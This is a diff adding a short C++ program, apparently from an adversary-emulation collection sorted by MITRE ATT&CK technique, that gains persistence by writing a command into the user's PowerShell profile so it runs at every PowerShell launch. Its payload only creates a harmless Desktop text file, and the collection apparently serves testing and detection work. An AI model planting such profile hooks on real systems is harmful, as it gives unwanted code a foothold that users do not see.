@@ -1,0 +1,36 @@
+---
+title: ".013.PowerShellProfile"
+folder: "05. Persistence/T1546 Event Triggered Execution"
+---
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <filesystem> 
+
+void PSProfile() {
+
+    std::string fileName = "C:\\Users\\User\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1";
+    std::string command = "New-Item -ItemType File -Path \"$env:USERPROFILE\\Desktop\\PSProfile.txt\"";
+    
+    std::filesystem::create_directories(std::filesystem::path(fileName).parent_path());
+    std::ofstream psFile(fileName);
+    if (!psFile.is_open()) {
+        return;
+    }
+
+    psFile << command;
+
+    psFile.close();
+
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    PSProfile();
+    return 0;
+}
